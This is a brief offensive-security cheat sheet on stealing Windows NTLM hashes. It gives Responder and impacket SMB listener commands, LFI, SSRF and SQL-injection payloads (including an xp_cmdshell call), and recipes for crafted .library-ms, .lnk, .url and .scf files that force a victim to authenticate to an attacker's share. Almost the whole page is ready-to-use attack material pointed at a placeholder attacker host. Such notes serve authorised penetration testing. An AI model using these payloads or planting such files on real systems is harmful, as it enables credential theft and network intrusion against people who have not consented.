---
icon: ear
---

# Stealing NTLM hashes

## Listener

```bash
sudo responder -I <interface>
```

```
impacket-smbserver share /dev/null -smb2support
```

## Possible Attacks

### Via web vulnerability

If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that allows you to include remote files, you can exploit it to steal the NTLM hash of the user running the process. For example:

<pre class="language-powershell"><code class="lang-powershell"># LFI
?page=\\&#x3C;attaker>\shared

# SSRF
?url=file:////&#x3C;attaker>/shared

# SQL Injection
?id=1' union select null,load_file('\\\\&#x3C;attaker>\\shared'),null-- -
?id=1' union select null,(select x from OpenRowset(BULK '\\&#x3C;attaker>\shared',SINGLE_CLOB) R(x)),null-- -
<strong>?id=1' union select null,(EXEC xp_cmdshell 'dir \\&#x3C;attaker>\shared'),null-- -
</strong></code></pre>

### Via .library-ms file

```sh
cat > \!shared.library-ms <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\<attacker>\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

### Via .lnk file

```powershell
pylnk3 c '\\<attacker>\shared' \!shared.lnk -i '\\<attacker>\shared\icon.ico'
```

### Via .url file

```sh
cat > \!shared.url <<EOF
[InternetShortcut]
URL=\\\\<attacker>\\shared
IconIndex=1
IconFile=\\\\<attacker>\\shared\\icon.ico
EOF
```

### Via .scf file

```sh
cat > \!shared.scf <<EOF
[Shell]
Command=2
IconFile=\\\\<attacker>\\shared\\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
```

## References

[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
